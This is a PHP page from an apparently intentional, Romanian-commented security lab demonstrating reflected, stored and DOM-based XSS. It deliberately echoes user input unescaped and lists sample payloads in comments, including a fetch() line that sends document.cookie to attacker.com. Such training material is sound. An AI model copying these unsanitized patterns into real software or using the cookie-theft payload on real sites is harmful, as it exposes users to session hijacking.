<?php
/**
 * Cross-Site Scripting (XSS) - Pagina Vulnerabila (Laborator Securitate)
 * 
 * VULNERABILITATE: Input-ul utilizatorului este reflectat in pagina fara sanitizare HTML.
 * 
 * EXPLOIT:
 *   - <script>alert('XSS')</script> in campul de comentarii
 *   - <img src=x onerror="alert(document.cookie)"> pentru furt de cookie-uri
 *   - <script>fetch('https://attacker.com/?c='+document.cookie)</script>
 */
$page_title = 'XSS Demo';
require_once dirname(__DIR__) . '/includes/header.php';

$comments = [];
$message = '';

// Store comments in session for demo (VULNERABLE - no sanitization)
if (!isset($_SESSION['xss_comments'])) {
    $_SESSION['xss_comments'] = [];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $comment = $_POST['comment']; // NESANITIZAT - VULNERABIL
    $name = $_POST['name'] ?? 'Anonim'; // NESANITIZAT - VULNERABIL
    $_SESSION['xss_comments'][] = ['name' => $name, 'comment' => $comment, 'time' => date('H:i:s')];
    $message = 'Comentariu adaugat. (Nesanitizat - vulnerabil la XSS)';
}

// VULNERABLE: Reflected XSS via GET parameter
$reflected = $_GET['msg'] ?? '';

// VULNERABLE: DOM-based XSS via URL fragment (simulated)
$search_term = $_GET['q'] ?? '';
?>

<h2>Cross-Site Scripting (XSS) - Demonstratie Vulnerabilitate</h2>

<div style="background: #ffe6e6; border-left: 5px solid #e74c3c; padding: 15px; margin-bottom: 20px;">
    <strong>VULNERABILITATE ACTIVA:</strong> Aceasta pagina este intentionat vulnerabila la XSS.
    Input-ul utilizatorului este reflectat in HTML fara sanitizare.
</div>

<section>
    <h2>1. XSS Reflectat (Reflected XSS)</h2>
    <p>Parametrul <code>msg</code> din URL este reflectat direct in pagina fara sanitizare.</p>
    
    <p><strong>Exploit sugerat:</strong> Adaugati la URL: <code>?msg=<script>alert('XSS')</script></code></p>
    
    <!-- VULNERABIL: output fara htmlspecialchars -->
    <div style="background: #fff3cd; padding: 15px; border-radius: 4px; margin-bottom: 15px;">
        <strong>Mesaj din URL:</strong> <?php echo $reflected; ?>
    </div>
    
    <p>
        <a href="xss.php?msg=%3Cscript%3Ealert('XSS+Reflectat!')%3C%2Fscript%3E" style="color: #e74c3c;">
            Click aici pentru a testa XSS Reflectat
        </a>
    </p>
    <p>
        <a href="xss.php?msg=%3Cimg+src%3Dx+onerror%3D%22alert(document.cookie)%22%3E" style="color: #e74c3c;">
            Click aici pentru furt de cookie-uri (simulat)
        </a>
    </p>
</section>

<section style="margin-top: 30px;">
    <h2>2. XSS Stocat (Stored XSS)</h2>
    <p>Comentariile sunt stocate si afisate fara sanitizare. Orice JavaScript injectat se va executa pentru toti vizitatorii.</p>
    
    <p><strong>Exploit sugerat:</strong> Introduceti <code><script>alert('XSS Stocat!')</script></code> ca si comentariu.</p>
    
    <form method="post" action="xss.php">
        <p>
            <label for="xss_name">Nume:</label>
            <input type="text" id="xss_name" name="name" value="<?php echo $_POST['name'] ?? ''; ?>">
        </p>
        <p>
            <label for="comment">Comentariu:</label>
            <textarea id="comment" name="comment" rows="4" required placeholder="Scrie un comentariu... sau injecteaza <script>alert(1)</script>"></textarea>
        </p>
        <input type="submit" value="Posteaza Comentariu">
    </form>
    
    <?php if ($message): ?>
        <p style="color: #e74c3c; margin-top: 10px;"><?php echo $message; ?></p>
    <?php endif; ?>
    
    <h3>Comentarii (VULNERABILE la XSS):</h3>
    <?php if (empty($_SESSION['xss_comments'])): ?>
        <p>Niciun comentariu inca.</p>
    <?php else: ?>
        <?php foreach ($_SESSION['xss_comments'] as $c): ?>
            <div style="background: #f9f9f9; border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 4px;">
                <!-- VULNERABIL: output fara htmlspecialchars -->
                <strong><?php echo $c['name']; ?></strong> 
                <small><?php echo $c['time']; ?></small>
                <p><?php echo $c['comment']; ?></p>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</section>

<section style="margin-top: 30px;">
    <h2>3. DOM-Based XSS (Cautare)</h2>
    <p>Termenul de cautare este inserat in DOM folosind innerHTML (vulnerabil).</p>
    
    <form method="get" action="xss.php" onsubmit="return searchXSS()">
        <p>
            <label for="q">Cauta:</label>
            <input type="text" id="q" name="q" value="<?php echo $search_term; ?>">
            <input type="submit" value="Cauta">
        </p>
    </form>
    
    <div id="search-result" style="background: #fff3cd; padding: 15px; border-radius: 4px; margin-top: 10px;">
        <!-- Populat de JavaScript -->
    </div>
</section>

<script>
    // VULNERABIL: DOM-based XSS prin innerHTML
    function searchXSS() {
        var q = document.getElementById('q').value;
        // VULNERABIL: innerHTML fara sanitizare
        document.getElementById('search-result').innerHTML = '<strong>Rezultate cautare pentru:</strong> ' + q;
        return false; // Prevent actual submit
    }
    
    var urlParams = new URLSearchParams(window.location.search);
    var q = urlParams.get('q');
    if (q) {
        document.getElementById('search-result').innerHTML = '<strong>Rezultate cautare pentru:</strong> ' + q;
    }
</script>

<?php require_once dirname(__DIR__) . '/includes/footer.php'; ?>
